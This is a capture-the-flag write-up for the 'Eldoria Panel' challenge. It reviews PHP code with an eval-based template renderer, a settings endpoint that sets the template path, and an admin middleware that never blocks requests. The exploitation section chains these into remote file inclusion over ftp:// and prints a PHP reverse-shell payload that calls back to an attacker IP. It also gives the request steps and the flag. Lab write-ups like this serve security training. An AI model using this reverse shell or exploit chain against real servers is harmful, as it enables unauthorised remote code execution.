# Eldoria Panel (Unintended solution)
Tags: #php #rfi #ftp #rce 
## TLDR
RFI -> RCE
## Description
> A development instance of a panel related to the Eldoria simulation was found. Try to infiltrate it to reveal Malakar's secrets.
## Overview
It's a website that shows quests that can be claimed.
## Road to flag
The flag is in a file with a random name `mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt` -> RCE
## Code review
- Every page is returned using `render`.
```php
$app->get('/dashboard', function (Request $request, Response $response, $args) {
    $html = render($GLOBALS['settings']['templatesPath'] . '/dashboard.php');
    $response->getBody()->write($html);
    return $response;
})->add($authMiddleware);
```

- The function `render` is vulnerable to RCE due to the use of `eval`
```php
function render($filePath) {
    if (!file_exists($filePath)) {
        return "Error: File not found.";
    }
    $phpCode = file_get_contents($filePath);
    ob_start();
    eval("?>" . $phpCode);
    return ob_get_clean();
}
```

But uses `file_exists` before calling `file_get_contents`. How can I provide a valid file?

- It's possible to set the **template path** calling `/api/admin/appSettings`
```php
$app->post('/api/admin/appSettings', function (Request $request, Response $response, $args) {
	$data = json_decode($request->getBody()->getContents(), true);
	if (empty($data) || !is_array($data)) {
		$result = ['status' => 'error', 'message' => 'No settings provided'];
	} else {
		$pdo = $this->get('db');
		$stmt = $pdo->prepare("INSERT INTO app_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value");
		foreach ($data as $key => $value) {
			$stmt->execute([$key, $value]);
		}
		if (isset($data['template_path'])) {
			$GLOBALS['settings']['templatesPath'] = $data['template_path'];
		}
		$result = ['status' => 'success', 'message' => 'Settings updated'];
	}
	$response->getBody()->write(json_encode($result));
	return $response->withHeader('Content-Type', 'application/json');
})->add($adminApiKeyMiddleware);
```

- The middleware is useless because calls `$handler->handle($request);` regardless -> every user can call admin routes.
```php
$adminApiKeyMiddleware = function (Request $request, $handler) use ($app) {
	if (!isset($_SESSION['user'])) {
		$apiKey = $request->getHeaderLine('X-API-Key');
		if ($apiKey) {
			$pdo = $app->getContainer()->get('db');
			$stmt = $pdo->prepare("SELECT * FROM users WHERE api_key = ?");
			$stmt->execute([$apiKey]);
			$user = $stmt->fetch(PDO::FETCH_ASSOC);
			if ($user && $user['is_admin'] === 1) {
				$_SESSION['user'] = [
					'id'              => $user['id'],
					'username'        => $user['username'],
					'is_admin'        => $user['is_admin'],
					'api_key'         => $user['api_key'],
					'level'           => 1,
					'rank'            => 'NOVICE',
					'magicPower'      => 50,
					'questsCompleted' => 0,
					'artifacts'       => ["Ancient Scroll of Wisdom", "Dragon's Heart Shard"]
				];
			}
		}
	}
	return $handler->handle($request);
};
```

## Exploitation
Since we can't write local files, we can't provide a valid local file to `file_exsists` and `file_get_contents` that triggers RCE.
To bypass the file operation restrictions, we can leverage PHP wrappers ([documentation](https://www.php.net/manual/en/wrappers.php)).
`HTTP` can't be used because `allow_url_fopen = on` is not present in `php.ini`.

After testing some of them, I found that `ftp` works with both `file_exsists` and `file_get_contents`.

Full exploit:
1. start an ftp server and host `dashboard.php` with content ``<?php $sock=fsockopen("IP",PORT);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>``
2. set template path: `POST /api/admin/appSettings` `{"template_path":"ftp://IP/dashboard.php"}`
3. get `/dashboard`
4. profit

`HTB{p41n_c4us3d_by_th3_usu4l_5u5p3ct_2976d9b37dabc9f2d52e7f45c1b954fe}`
